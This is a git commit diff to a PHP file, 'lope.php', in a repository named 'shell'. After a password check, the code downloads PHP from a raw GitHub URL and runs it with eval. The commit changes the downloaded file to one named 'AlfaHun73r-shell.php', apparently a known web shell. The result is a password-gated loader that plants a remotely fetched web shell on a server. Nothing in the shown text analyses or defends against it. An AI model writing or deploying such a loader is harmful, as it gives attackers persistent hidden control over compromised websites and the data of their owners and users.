c5c677d105b32e2faaea046fd3f89cd1e941a89c
1llsion <156107986+1llsion@users.noreply.github.com>
2024-11-30 00:30:51 +0700

    Update lope.php

--- lope.php
+++ lope.php
@@ -56,7 +56,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-  $a = geturlsinfo('https://raw.githubusercontent.com/1llsion/shell/main/agen.php');
+  $a = geturlsinfo('https://raw.githubusercontent.com/1llsion/shell/refs/heads/main/AlfaHun73r-shell.php');
   eval('?>' . $a);
 } else {
   // Display login form if not logged in
